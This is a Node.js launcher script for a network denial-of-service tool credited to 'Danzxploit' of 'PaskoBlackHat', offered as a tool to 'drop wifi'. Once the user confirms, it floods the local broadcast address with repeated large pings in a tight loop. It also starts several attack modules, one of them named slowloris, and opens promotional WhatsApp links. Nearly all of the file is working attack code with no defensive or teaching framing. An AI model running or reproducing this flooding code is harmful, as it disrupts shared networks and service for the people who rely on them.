/**
  * Import Readline and Child_process
  * Used to drop wifi
  * Not suitable for users with RAM below 2 GB
  * Does not support large-scale attacks on 5Ghz router networks
  * Powered by PaskoBlackHat
  * Powered by PaskoBlackHat
  * Powered by Danzxploit
  * Powered by Danzxploit
*/
import { spawn,exec } from 'child_process'
import readline from 'readline'
import chalk from 'chalk'
import open from 'open'
/*───────────────────────────────────────────*/
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});
const log = console.log;
/*───────────────────────────────────────────*/
async function unyu(){
    await open('https://whatsapp.com/channel/0029VbB6BCGFMqrU1maExD1b');
	await clear();
	await log(chalk.hex('#FF3737')(`


     ██████╗   █████╗  ███╗   ██╗ ███████╗ ██╗  ██╗
     ██╔══██╗ ██╔══██╗ ████╗  ██║ ╚══███╔╝ ╚██╗██╔╝
     ██║  ██║ ███████║ ██╔██╗ ██║   ███╔╝   ╚███╔╝
     ██║  ██║ ██╔══██║ ██║╚██╗██║  ███╔╝    ██╔██╗
     ██████╔╝ ██║  ██║ ██║ ╚████║ ███████╗ ██╔╝ ██╗
     ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═╝

       ██████╗  ██╗       ██████╗  ██╗ ████████╗
       ██╔══██╗ ██║      ██╔═══██╗ ██║ ╚══██╔══╝
       ██████╔╝ ██║      ██║   ██║ ██║    ██║
       ██╔═══╝  ██║      ██║   ██║ ██║    ██║
       ██║      ███████╗ ╚██████╔╝ ██║    ██║
       ╚═╝      ╚══════╝  ╚═════╝  ╚═╝    ╚═╝
    ──────────────────────────────────────────────
    Tools created by Danzxploit from PaskoBlackHat
         other than this it is definitely fake!
          What are the features in this tool?
            ╭────────────────────────────╮
            ├> Owner : Danzxploit        │
            ├> Team  : PaskoBlackHat     │
            ├──────────────┬─────────────┤
            ├• > ArpAttack │• IcmpAttack │
            ├• > BroadCast │• UdpAttack  │
            └──────────────┴─────────────┘
            
	`));
	rl.question(chalk.hex('#FF3737').bold('            Do you want to continue? Y/n: '), (lendir) => {
		switch(lendir.toLowerCase()){
		  case 'yes':
		  case 'y':
		    owh();
		    setInterval(()=>{
		    	exec('ping -b -s 1400 192.168.1.255');
		    	exec('ping -b -s 1400 192.168.1.255');
		    	exec('ping -b -s 1400 192.168.1.255');
		    	exec('ping -b -s 1400 192.168.1.255');
		    },0);
		    open('https://chat.whatsapp.com/Ew0AhPxg1bW9UM6hvhfN6X?mode=wwc');
		  break;
		  case 'no':
		  case 'n':
		    rl.close();
		    log(chalk.hex('#FF3737').italic.bold('            Created by Danzxploit'))
		    logout();
		    logout();
		    logout();
		    logout();
		  break;
			default:
			 log(chalk.hex('#ff3737').bold('            Command not recognized!'))
			 rl.close();
		}
	})
} unyu();
/*───────────────────────────────────────────*/
function run(path){
	spawn('node',[path],{
		stdio: 'inherit'
	});
} function logout(){
	process.exit(0);
} function clear(){
	spawn('clear',{
		stdio: "inherit"
	});
}
/*───────────────────────────────────────────*/
async function owh(){
	await run('./core/cx100.js');
	await run('./core/cx200.js');
	await run('./core/cx300.js');
	await run('./core/armour.js');
	await run('./core/armourcx.js');
	await run('./core/armourcv.js');
	await run('./core/danger!/amor.js');
	await run('./core/danger!/amora.js');
	await run('./core/danger!/slowloris.js');
	await run('./PaskoBlackHatIsTheKing/danzxploit.js');
	await run('./PaskoBlackHatIsTheKing/danzxploit2.js');
	await run('./PaskoBlackHatIsTheKing/danzxploit3.js');
	await run('./PaskoBlackHatIsTheKing/danzxploit4.js');
	await run('./PaskoBlackHatIsTheKing/danzxploit5.js');
}
